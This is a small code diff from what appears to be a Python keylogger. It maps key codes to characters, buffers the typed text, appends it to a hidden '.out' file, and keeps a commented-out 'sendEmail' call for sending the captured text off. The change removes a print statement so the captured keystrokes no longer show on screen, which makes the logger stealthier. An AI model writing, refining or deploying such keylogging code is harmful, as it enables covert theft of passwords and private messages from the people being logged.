@@ -130,7 +130,6 @@ def main():
                 typed += qwerty_map[code]
         if len(typed) > BUF_SIZE:
             #sendEmail(typed)
-            print(typed)
             f = open('.out', 'a+')
             f.write(typed)
             f.close()
